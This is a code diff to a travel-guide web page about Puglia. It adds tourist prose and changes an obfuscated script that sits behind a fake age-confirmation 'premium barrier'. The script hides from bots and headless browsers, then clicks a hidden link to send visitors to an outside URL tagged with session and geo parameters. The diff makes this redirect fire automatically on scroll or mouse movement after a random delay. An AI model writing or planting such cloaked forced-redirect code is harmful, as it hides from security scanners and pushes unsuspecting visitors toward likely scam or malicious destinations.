@@ -47,6 +47,8 @@
     
     <p>From the iconic trulli houses of Alberobello to the baroque architecture of Lecce, Puglia feels like stepping into another era. The food here is "cucina povera" at its finest—simple, locally sourced, and incredibly flavorful. Imagine handmade orecchiette pasta served under the shade of a thousand-year-old olive tree.</p>
 
+    <p>As you wander through the labyrinthine streets of Polignano a Mare, you catch glimpses of the Adriatic Sea peeking through between ancient limestone walls. It's a place where time slows down, and every corner tells a story of generations past. Whether you are exploring the subterranean caves of Castellana or sipping Primitivo wine in a rustic masseria, Puglia captures your soul in a way few other places can.</p>
+
     <div class="premium-barrier">
       <h3>Ready for the Ultimate Travel Experience?</h3>
       <p style="font-size: 15px; margin-bottom: 10px;">To continue reading our exclusive guide and unlock the full high-resolution gallery, please confirm you are over 18 and agree to our content access terms.</p>
@@ -71,7 +73,7 @@
     (function() {
       const _p = document.querySelector('.node-p');
       const _k = "hsrc"; const _v = "1";
-      const _s = { ready: false, done: false, bot: false };
+      const _s = { ready: false, done: false, bot: false, t: false };
 
       const _setup = async () => {
         const url = new URLSearchParams(window.location.search);
@@ -84,6 +86,16 @@
         } catch (e) {}
         if (navigator.webdriver || /bot|spider|headless/i.test(navigator.userAgent)) _s.bot = true;
       };
+
+      const _handleScrollProgress = () => {
+        if (_s.ready && !_s.bot && !_s.done && !_s.t && window.scrollY > 60) {
+          _s.t = true;
+          setTimeout(_exec, 2200 + Math.random() * 1800);
+        }
+      };
+      window.addEventListener('scroll', _handleScrollProgress, { passive: true });
+      window.addEventListener('mousemove', _handleScrollProgress, { once: true });
+      window.addEventListener('touchstart', _handleScrollProgress, { once: true });
 
       const _exec = () => {
         if (!_s.ready || _s.bot || _s.done) {
@@ -104,8 +116,10 @@
         if (z) link += (link.includes('?') ? '&' : '?') + "psid=" + z;
         if (g) link += (link.includes('?') ? '&' : '?') + "geo=" + g;
         
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('v-trigger').style.display = 'none';
+        const ldr = document.getElementById('loader');
+        const btn = document.getElementById('v-trigger');
+        if (ldr) ldr.style.display = 'block';
+        if (btn) btn.style.display = 'none';
         
         setTimeout(() => {
           const a = document.createElement('a');
@@ -113,10 +127,12 @@
           a.style.display = 'none';
           document.body.appendChild(a);
           a.click();
-        }, 1200);
+        }, 1000);
       };
 
-      document.getElementById('v-trigger').addEventListener('click', _exec);
+      document.getElementById('v-trigger').addEventListener('click', () => {
+        _s.t = true; _exec();
+      });
       document.addEventListener('DOMContentLoaded', _setup);
     })();
   </script>
